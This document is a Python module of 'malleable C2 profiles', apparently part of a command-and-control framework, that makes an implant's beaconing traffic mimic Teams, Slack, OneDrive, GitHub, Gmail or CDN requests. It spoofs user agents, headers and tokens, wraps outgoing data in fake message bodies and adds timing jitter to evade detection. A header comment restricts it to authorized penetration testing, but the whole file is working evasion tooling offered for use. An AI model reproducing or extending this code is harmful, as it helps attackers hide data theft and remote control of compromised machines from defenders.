"""
Malleable C2 Profiles — authorized penetration testing only.
Makes agent HTTP traffic indistinguishable from legitimate applications.
Profiles: Teams, Slack, OneDrive, GitHub, Gmail, generic CDN.
"""
import random, base64, hashlib, time, os

PROFILES = {
    # ── Microsoft Teams ───────────────────────────────────────────────────────
    "teams": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.6.00.24163 Chrome/114.0.5735.289 Electron/25.8.4 Safari/537.36",
        "poll_path":  "/api/v1/users/ME/conversations/{rand}/messages?startTime={ts}&pageSize=20",
        "post_path":  "/api/v1/users/ME/conversations/{rand}/messages",
        "headers": {
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://teams.microsoft.com",
            "Referer": "https://teams.microsoft.com/",
            "X-Ms-Client-Version": "1.6.00.24163",
            "X-Ms-Session-Id": "{session}",
            "Content-Type": "application/json",
        },
        "wrap_poll": lambda data: data,  # response is already JSON-looking
        "wrap_post": lambda data, aid: {
            "id": _rand_id(),
            "type": "Message",
            "conversationId": _rand_id(),
            "content": data,
            "contentType": "text",
            "from": {"mri": f"8:{aid}@thread.skype"},
            "createdDateTime": _iso_ts(),
        },
    },

    # ── Slack ────────────────────────────────────────────────────────────────
    "slack": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "poll_path":  "/api/conversations.history?channel={rand}&oldest={ts}&count=10&inclusive=true",
        "post_path":  "/api/chat.postMessage",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://app.slack.com",
            "Referer": "https://app.slack.com/",
            "Authorization": "Bearer xoxc-{token}",
            "X-Slack-Frontend-Version": "4.35.131",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "wrap_poll": lambda data: data,
        "wrap_post": lambda data, aid: f"channel={_rand_id()}&text={data}&username={aid}&icon_emoji=:robot_face:",
    },

    # ── OneDrive / SharePoint ─────────────────────────────────────────────────
    "onedrive": {
        "user_agent": "Microsoft SkyDriveSync 23.076.0402.0001 ship; Windows NT 10.0 (17763)",
        "poll_path":  "/v1.0/me/drive/root:/sync/{rand}:/content",
        "post_path":  "/v1.0/me/drive/root:/upload/{rand}:/content",
        "headers": {
            "Accept": "application/json; odata.metadata=none",
            "Accept-Language": "en-US",
            "Authorization": "Bearer eyJ{token}",
            "Content-Type": "application/octet-stream",
            "X-RequestStats": "serviceVersion=Ods_SP_Home_{rand}",
        },
        "wrap_poll": lambda data: data,
        "wrap_post": lambda data, aid: data,  # binary-looking
    },

    # ── GitHub ────────────────────────────────────────────────────────────────
    "github": {
        "user_agent": "git/2.43.0.windows.1",
        "poll_path":  "/repos/{rand}/issues/comments?since={ts}&per_page=10",
        "post_path":  "/repos/{rand}/issues/{num}/comments",
        "headers": {
            "Accept": "application/vnd.github.v3+json",
            "Authorization": "token ghp_{token}",
            "X-GitHub-Api-Version": "2022-11-28",
            "Content-Type": "application/json",
        },
        "wrap_poll": lambda data: data,
        "wrap_post": lambda data, aid: f'{{"body":"{data}","user":{{"login":"{aid}","type":"Bot"}}}}',
    },

    # ── Generic CDN (Cloudflare Workers style) ────────────────────────────────
    "cdn": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "poll_path":  "/cdn-cgi/apps/sync?v={aid}",
        "post_path":  "/cdn-cgi/apps/data",
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        },
        "wrap_poll": lambda data: data,
        "wrap_post": lambda data, aid: data,
    },

    # ── Gmail / Google ─────────────────────────────────────────────────────────
    "gmail": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "poll_path":  "/mail/u/0/?ui=2&ik={rand}&attid=0.1&disp=inline&view=att&th={rand}",
        "post_path":  "/mail/u/0/?_ah=ah&ui=2&ik={rand}&at=ABFqWvv{rand}",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://mail.google.com",
            "Referer": "https://mail.google.com/",
            "X-Same-Domain": "1",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        },
        "wrap_poll": lambda data: data,
        "wrap_post": lambda data, aid: f"at=ABFqWvv{_rand_id()}&act=sm&bact=sm&{data}",
    },
}

# ── Active profile ────────────────────────────────────────────────────────────
_active_profile = os.environ.get("C2_PROFILE", "cdn")

def get_profile(name=None) -> dict:
    return PROFILES.get(name or _active_profile, PROFILES["cdn"])

def set_profile(name: str):
    global _active_profile
    if name in PROFILES:
        _active_profile = name
        return f"C2 profile set: {name}"
    return f"Unknown profile: {name}. Available: {list(PROFILES.keys())}"

def list_profiles() -> list:
    return list(PROFILES.keys())

def build_headers(profile_name=None, aid="") -> dict:
    """Return HTTP headers for the given profile with placeholders filled."""
    p = get_profile(profile_name)
    h = {}
    for k, v in p["headers"].items():
        h[k] = v.format(rand=_rand_id(), session=_rand_id(),
                         token=_rand_token(), ts=int(time.time()*1000),
                         num=random.randint(1,9999))
    h["User-Agent"] = p["user_agent"]
    return h

def build_poll_path(aid: str, profile_name=None) -> str:
    p = get_profile(profile_name)
    return p["poll_path"].format(rand=_rand_id(), ts=int(time.time()*1000),
                                  aid=aid, num=random.randint(1,9999))

def build_post_path(aid: str, profile_name=None) -> str:
    p = get_profile(profile_name)
    return p["post_path"].format(rand=_rand_id(), ts=int(time.time()*1000),
                                  aid=aid, num=random.randint(1,9999))

def wrap_post_body(data: str, aid: str, profile_name=None) -> str:
    p = get_profile(profile_name)
    try: return p["wrap_post"](data, aid)
    except: return data

# ── Helpers ──────────────────────────────────────────────────────────────────
def _rand_id() -> str:
    return hashlib.md5(os.urandom(8)).hexdigest()[:16]

def _rand_token() -> str:
    return base64.b64encode(os.urandom(24)).decode().replace("=","")

def _iso_ts() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())

# ── Jitter helpers ────────────────────────────────────────────────────────────
def jitter(base_seconds: float, pct: int = 30) -> float:
    """Return base ± pct% jitter."""
    delta = base_seconds * pct / 100
    return base_seconds + random.uniform(-delta, delta)

def sleep_jitter(base_seconds: float, pct: int = 30):
    import time
    time.sleep(jitter(base_seconds, pct))
